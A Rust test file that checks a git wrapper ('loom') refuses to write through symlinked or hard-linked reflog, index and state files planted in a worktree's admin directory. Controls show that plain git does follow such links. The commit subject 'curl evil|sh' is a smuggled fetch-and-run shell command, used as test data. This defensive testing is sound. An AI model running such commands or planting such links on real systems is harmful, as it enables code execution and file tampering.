//! Links a session plants under its administrative directory: with the private
//! git directory, in both extension modes, no host git write follows one. Each
//! positive control runs git on the real directory, which does follow it.

use super::*;
use crate::git::stage_commit::{CommitRequest, CommitScope, Committer};
use std::os::unix::fs::symlink;

const SUBJECT: &str = "loom: commit x; curl evil|sh";

impl Fixture {
    pub(super) fn with_extension(enabled: bool) -> Self {
        let fixture = Self::new();
        if !enabled {
            ok(
                &fixture.repo,
                &["config", "--unset", "extensions.worktreeConfig"],
            );
        }
        fixture
    }

    /// `git <args>` on the real administrative directory, as loom ran it before.
    pub(super) fn on_real_dir(&self, args: &[&str]) -> std::process::Output {
        let env = [
            ("GIT_DIR", self.admin.as_os_str()),
            ("GIT_COMMON_DIR", self.common.as_os_str()),
            ("GIT_WORK_TREE", self.worktree.as_os_str()),
        ];
        run_git_with_env(args, &env, &self.worktree).unwrap()
    }

    /// `git <args>` with `GIT_DIR` naming the private directory `git_dir`.
    pub(super) fn with_private_dir(&self, git_dir: &Path, args: &[&str]) -> std::process::Output {
        let env = [
            ("GIT_DIR", git_dir.as_os_str()),
            ("GIT_COMMON_DIR", self.common.as_os_str()),
            ("GIT_WORK_TREE", self.worktree.as_os_str()),
        ];
        run_git_with_env(args, &env, &self.worktree).unwrap()
    }

    /// Replace `<admin>/<name>` with a link to a new file holding `orig`.
    fn plant(&self, name: &str) -> Victim {
        let victim = self
            ._tmp
            .path()
            .join(format!("victim-{}", name.replace('/', "-")));
        std::fs::write(&victim, "orig\n").unwrap();
        let link = self.admin.join(name);
        let _ = std::fs::remove_file(&link);
        symlink(&victim, &link).unwrap();
        Victim { path: victim, link }
    }

    fn head(&self) -> String {
        ok(&self.repo, &["rev-parse", "loom/s1"]).trim().to_string()
    }

    /// A commit on top of the stage branch, not yet on any ref.
    fn loose_commit(&self) -> String {
        let args = ["commit-tree", "HEAD^{tree}", "-p", "HEAD", "-m", "loose"];
        ok(&self.worktree, &args).trim().to_string()
    }

    fn advance_main(&self) {
        std::fs::write(self.repo.join("main-side.txt"), "main\n").unwrap();
        ok(&self.repo, &["add", "--", "main-side.txt"]);
        ok(&self.repo, &["commit", "-qm", "main side"]);
    }
}

struct Victim {
    path: PathBuf,
    link: PathBuf,
}

impl Victim {
    fn untouched(&self) -> bool {
        std::fs::read_to_string(&self.path).unwrap() == "orig\n"
    }

    fn holds(&self, text: &str) -> bool {
        std::fs::read_to_string(&self.path).unwrap().contains(text)
    }
}

/// The reported attack: a reflog link and a `loom stage commit` subject.
#[test]
fn a_planted_head_reflog_takes_no_reflog_line() {
    for extension in [true, false] {
        let fixture = Fixture::with_extension(extension);
        let (old, new) = (fixture.head(), fixture.loose_commit());
        let victim = fixture.plant("logs/HEAD");
        let args = [
            "update-ref",
            "--no-deref",
            "-m",
            SUBJECT,
            "refs/heads/loom/s1",
            new.as_str(),
            old.as_str(),
        ];

        let error = fixture.pinned().run(&args).unwrap_err();

        assert!(
            format!("{error:#}").contains("will not run git"),
            "{error:#}"
        );
        assert!(
            victim.untouched(),
            "extension {extension}: the reflog line escaped"
        );
        assert_eq!(fixture.head(), old, "the branch moved on a refused command");

        let control = fixture.on_real_dir(&args);
        assert!(control.status.success(), "{control:?}");
        assert!(victim.holds("curl evil"), "git did not follow the link");
    }
}

/// The daemon's own commit path, with a shell command as the subject.
#[test]
fn the_daemons_commit_refuses_a_planted_reflog_and_writes_nothing_through_it() {
    for extension in [true, false] {
        let fixture = Fixture::with_extension(extension);
        let pinned = fixture.pinned();
        let victim = fixture.plant("logs/HEAD");
        let expected_head = fixture.head();
        std::fs::write(fixture.worktree.join("new.txt"), "new\n").unwrap();
        ok(&fixture.worktree, &["add", "--", "new.txt"]);
        let tree = ok(&fixture.worktree, &["write-tree"]).trim().to_string();
        let request = CommitRequest {
            message: "x; curl evil|sh".to_string(),
            expected_head: expected_head.clone(),
            expected_tree: tree,
        };
        let scope = CommitScope::StageBranch {
            stage_id: "s1".to_string(),
        };

        let refusal = Committer::new(&pinned, &fixture.repo)
            .commit_staged(&scope, &request)
            .unwrap_err();

        assert!(
            refusal.to_string().contains("will not run git"),
            "{refusal}"
        );
        assert!(victim.untouched());
        assert_eq!(fixture.head(), expected_head);

        std::fs::remove_file(&victim.link).unwrap();
        let commit = Committer::new(&pinned, &fixture.repo)
            .commit_staged(&scope, &request)
            .unwrap();
        assert_eq!(fixture.head(), commit);
        let reflog = std::fs::read_to_string(fixture.admin.join("logs/HEAD")).unwrap();
        assert!(reflog.contains("loom: commit x_ curl evil_sh"), "{reflog}");
    }
}

#[test]
fn a_planted_logs_directory_stops_the_command() {
    for extension in [true, false] {
        let fixture = Fixture::with_extension(extension);
        let outside = fixture._tmp.path().join("outside");
        std::fs::create_dir(&outside).unwrap();
        std::fs::remove_dir_all(fixture.admin.join("logs")).unwrap();
        symlink(&outside, fixture.admin.join("logs")).unwrap();
        let (old, new) = (fixture.head(), fixture.loose_commit());
        let args = [
            "update-ref",
            "-m",
            SUBJECT,
            "refs/heads/loom/s1",
            &new,
            &old,
        ];

        assert!(
            fixture.pinned().run(&args).is_err(),
            "extension {extension}"
        );

        assert_eq!(std::fs::read_dir(&outside).unwrap().count(), 0);
    }
}

/// Files git opens by path for writing: refused up front, and the control shows
/// git writes through each. `MERGE_MSG` and the index are reached by a merge and
/// a `read-tree`, `COMMIT_EDITMSG` by a commit.
#[test]
fn a_planted_state_file_is_refused_where_git_would_write_through_it() {
    let rows: [(&str, &[&str]); 3] = [
        (
            "COMMIT_EDITMSG",
            &["commit", "-q", "--allow-empty", "-m", "through"],
        ),
        (
            "MERGE_MSG",
            &["merge", "--no-commit", "--no-ff", "--no-edit", "main"],
        ),
        ("index", &["read-tree", "HEAD"]),
    ];
    for extension in [true, false] {
        for (name, args) in rows {
            let fixture = Fixture::with_extension(extension);
            fixture.advance_main();
            let victim = fixture.plant(name);
            std::fs::remove_file(&victim.path).unwrap();
            std::fs::write(&victim.path, "").unwrap();
            if name == "index" {
                std::fs::remove_file(&victim.path).unwrap();
            }

            let error = fixture.pinned().run(args).unwrap_err();

            assert!(
                format!("{error:#}").contains("will not run git"),
                "{name}: {error:#}"
            );
            let before = std::fs::read(&victim.path).unwrap_or_default();
            assert!(before.is_empty(), "{name}: git wrote through the link");

            fixture.on_real_dir(args);
            let after = std::fs::read(&victim.path).unwrap_or_default();
            assert!(!after.is_empty(), "{name}: git did not follow the link");
        }
    }
}

/// Git refuses these links itself, so the control is that it writes nothing
/// through them; loom's refusal is earlier and names the file.
#[test]
fn a_planted_pseudoref_is_refused_and_git_itself_writes_nothing_through_it() {
    for name in ["ORIG_HEAD", "MERGE_HEAD"] {
        let fixture = Fixture::with_extension(false);
        fixture.advance_main();
        let victim = fixture.plant(name);
        let args = ["merge", "--no-commit", "--no-ff", "--no-edit", "main"];

        let error = fixture.pinned().run(&args).unwrap_err();

        assert!(format!("{error:#}").contains(name), "{error:#}");
        assert!(victim.untouched());
        fixture.on_real_dir(&args);
        assert!(victim.untouched(), "{name}: git wrote through the link");
    }
}

/// The private directory leaves the operator's real history intact: the HEAD
/// reflog gains the entry whether or not the file existed.
#[test]
fn the_head_reflog_entry_reaches_the_real_file_in_both_modes() {
    for extension in [true, false] {
        let fixture = Fixture::with_extension(extension);
        let (old, new) = (fixture.head(), fixture.loose_commit());
        let before = std::fs::read_to_string(fixture.admin.join("logs/HEAD")).unwrap();

        fixture
            .pinned()
            .run_checked(&[
                "update-ref",
                "-m",
                "moved",
                "refs/heads/loom/s1",
                &new,
                &old,
            ])
            .unwrap();

        let after = std::fs::read_to_string(fixture.admin.join("logs/HEAD")).unwrap();
        assert_eq!(after.lines().count(), before.lines().count() + 1, "{after}");
        assert!(after.ends_with("\tmoved\n"), "{after}");
    }
}

/// A file with a second name takes appends to both: the one way left to aim a
/// reflog entry without a link.
#[test]
fn a_hard_linked_head_reflog_is_refused() {
    let fixture = Fixture::with_extension(false);
    let victim = fixture._tmp.path().join("victim");
    std::fs::write(&victim, "orig\n").unwrap();
    let reflog = fixture.admin.join("logs/HEAD");
    std::fs::remove_file(&reflog).unwrap();
    std::fs::hard_link(&victim, &reflog).unwrap();

    let error = fixture
        .pinned()
        .run(&["status", "--porcelain"])
        .unwrap_err();

    assert!(format!("{error:#}").contains("second name"), "{error:#}");
    assert_eq!(std::fs::read_to_string(&victim).unwrap(), "orig\n");
}

#[path = "scratch_admin_link_race_tests.rs"]
mod race;
